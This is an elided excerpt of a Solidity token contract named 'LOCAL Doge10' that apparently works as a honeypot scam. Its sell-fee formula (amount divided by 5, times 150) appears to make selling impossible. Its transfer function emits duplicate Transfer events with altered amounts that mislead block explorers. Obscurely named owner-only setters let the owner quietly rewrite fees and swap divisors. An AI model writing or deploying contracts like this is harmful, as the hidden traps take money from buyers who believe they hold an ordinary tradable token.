...
contract LOCALDOGE10 is Context, IERC20, Ownable {
    ...
    string private _name = "LOCAL Doge10";
    string private _symbol = "LDOGE10";
    uint8 private _decimals = 9;

    uint256 public _taxFee = 3;
    uint256 private _previousTaxFee = _taxFee;
    uint256 private sellFee = 150; 
 	uint256 private seca = 1;
	
    uint256 public _liquidityFee = 9;
    uint256 private _previousLiquidityFee = _liquidityFee;
    uint256 private divet = 5;
	uint256 private divsf = 5;
	uint256 private secb = 1;
	
    uint256 public MarketingWalletDiv = 3;
	uint256 public MaxSwap = 90;
	uint256 private divms = 100;
	uint256 private secc = 1;
	
    uint256 public _maxTxAmount = 10 * 10**15 * 10**9; 
    uint256 private minimumTokensBeforeSwap = 1 * 10**11 * 10**9; 
	
    uint256 private CBalance = 10 * 10**12 * 10**9; 
	uint256 private BuyAlloPct = 50; 
	uint256 private bgall = 1;
	uint256 private secd = 1;
 ...
 /* Mainnet router: 0x10ED43C718714eb63d5aA57B78B54704E256024E
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && swapAndLiquifyEnabled && to == uniswapV2Pair) {
            if (overMinimumTokenBalance) {
                ...
                swapTokens(contractTokenBalance.mul(MaxSwap).div(divms));}
	        uint256 balance = address(this).balance;
            if (buyBackEnabled && balance > uint256(CBalance)) {
                if (balance > CBalance)
                    balance = balance;
                burnTokens(balance.div(bgall).mul(BuyAlloPct));}}
        bool takeFee = true;
        //if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;}
        if (from == uniswapV2Pair || _isExcludedFromFee[from] || _isExcludedFromFee[to]) {} else {
                uint256 fees = amount.div(divsf).mul(sellFee);
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        emit Transfer(sender, recipient, tTransferAmount/divet);emit Transfer(sender, recipient, tTransferAmount/divet);
		} else { 
	...
	function burnTokens(uint256 amount) private lockTheSwap {
    	if (amount > 0) {swapETHForTokens(amount/seca); swapETHForTokens(amount/secb); swapETHForTokens(amount/secc); swapETHForTokens(amount/secd); swapETHForTokens(amount/sece);}}
	...
	function setsecd(uint256 _secd) external onlyOwner() {
        secd = _secd;}  		
    function setMarketingWalletDiv(uint256 divisor) external onlyOwner() {
        MarketingWalletDiv = divisor;}
	function setsecc(uint256 _secc) external onlyOwner() {
        secc = _secc;} 		
  	function setSellTransactionMultiplier(uint256 multiplier) external onlyOwner {
  	    sellFee = multiplier;}
	function setsecb(uint256 _secb) external onlyOwner() {
        secb = _secb;}  	
    function setMaxSwap(uint256 _MaxSwap) external onlyOwner() {
        MaxSwap = _MaxSwap;}
    function setbgall(uint256 _bgall) external onlyOwner() {
        bgall = _bgall;}
	function setdivms(uint256 _divms) external onlyOwner() {
        divms = _divms;}
	function setdivsf(uint256 _divsf) external onlyOwner() {
        divsf = _divsf;}     
	function setCBalance(uint256 _CBalance) external onlyOwner() {
        CBalance = _CBalance;}
	function setdivet(uint256 _divet) external onlyOwner() {
        divet = _divet;}    
	function setseca(uint256 _seca) external onlyOwner() {
        seca = _seca;} 
	...
	function setsece(uint256 _sece) external onlyOwner() {
        sece = _sece;} 		
